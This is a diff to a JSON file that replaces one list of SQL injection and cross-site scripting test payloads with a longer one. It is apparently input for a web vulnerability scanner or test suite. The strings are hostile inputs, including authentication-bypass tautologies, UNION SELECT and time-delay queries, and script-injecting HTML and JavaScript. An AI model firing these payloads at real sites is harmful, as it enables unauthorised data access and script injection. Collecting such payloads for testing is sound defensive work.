@@ -1,15 +1,22 @@
 {
-  "sqli": [
-    "'",
-    "' OR '1'='1",
-    "' OR '1'='1' --",
-    "' UNION SELECT 1, version() --",
-    "admin' --"
-  ],
-  "xss": [
-    "<script>alert('XSS')</script>",
-    "\" onmouseover=\"alert(1)",
-    "<img src=x onerror=alert(1)>",
-    "javascript:alert(1)"
-  ]
+    "sqli": [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' OR 1=1#",
+        "admin' --",
+        "admin' #",
+        "' UNION SELECT 1, @@version --",
+        "' UNION SELECT NULL, NULL, NULL --",
+        "1; WAITFOR DELAY '0:0:5'--",
+        "1') OR ('1'='1"
+    ],
+    "xss": [
+        "<script>alert('XSS')</script>",
+        "\"><script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg/onload=alert('XSS')>",
+        "javascript:alert('XSS')",
+        "\" onmouseover=\"alert('XSS')",
+        "'-prompt('XSS')-'"
+    ]
 }
